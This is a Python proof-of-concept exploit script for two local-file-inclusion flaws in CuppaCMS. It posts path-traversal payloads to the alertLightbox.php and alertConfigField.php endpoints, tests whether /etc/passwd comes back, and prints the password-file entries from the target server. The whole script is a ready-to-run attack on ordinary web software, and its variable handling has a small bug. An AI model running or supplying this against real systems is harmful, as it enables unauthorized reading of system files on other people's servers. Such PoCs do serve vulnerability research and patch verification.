#!/usr/bin/env python3                                                                                                                                                             
                                                                                                                                                                                      
import requests                                                                                                                                                                       
import argparse
import sys
    
headers = {}
headers['Accept'] = "*/*"
headers["Content-Type"] = "application/x-www-form-urlencoded"

def isVulnerable(url, script, param):
    
    u = url + script
    data = param+'=../../../../../../../../etc/passwd'
    
    req = requests.post(u, headers = headers, data = data)
    if('root:x:' in req.text):
        return True
    else: return False


def dumpPasswd(url, script, param, path):
    u = url + script
    data = param+'=../../../../../../../../'+path
    req = requests.post(u, headers = headers, data = data)
    print("\n[+] Dumping " + path + "\n")
    response = req.text
    for line in response.splitlines():
        if(":x:" in line):
            print(line)
    return

def main():
    parser = argparse.ArgumentParser(description="PoC exploit for CuppaCMS 4 January 2022.")
    parser.add_argument("url", type=str, metavar="URL", help="\t\t Specify url. Ex: 'http://10.10.10.10/CuppaCMS' ")
    
    args = parser.parse_args()
    url = args.url

    scriptOne = "/alerts/alertLightbox.php"
    parameterOne = "url"
    scriptTwo = "/alerts/alertConfigField.php"
    parameterTwo = "urlConfig"
   

    #Testing----------------
    
    print("Testing first LFI...")
    
    if(isVulnerable(url, scriptOne, parameterOne)):
        print("[+] LFI vulnerable -> '" + url+scriptOne + "', parameter: $_POST['"+ parameterOne +"']")
        vulnerableFromBefore = True
    else:
        print("[-] Target is not vulnerable")

    print("\nTesting second LFI...")
    

    if(isVulnerable(url, scriptTwo, parameterTwo)):
        print("[+] LFI vulnerable -> '" + url+scriptTwo + "', parameter: $_POST['" + parameterTwo + "']")
        dumpPasswd(url, scriptOne, parameterOne, "/etc/passwd")
        sys.exit(0)
    else:
        if(vulnerableFromBefore):
            dumpPasswd(url, scriptOne, parameterOne, "/etc/passwd")
            sys.exit(0)
        print("[-] Target is not vulnerable")
    
    #End Testing------------


if __name__ == "__main__":
    main()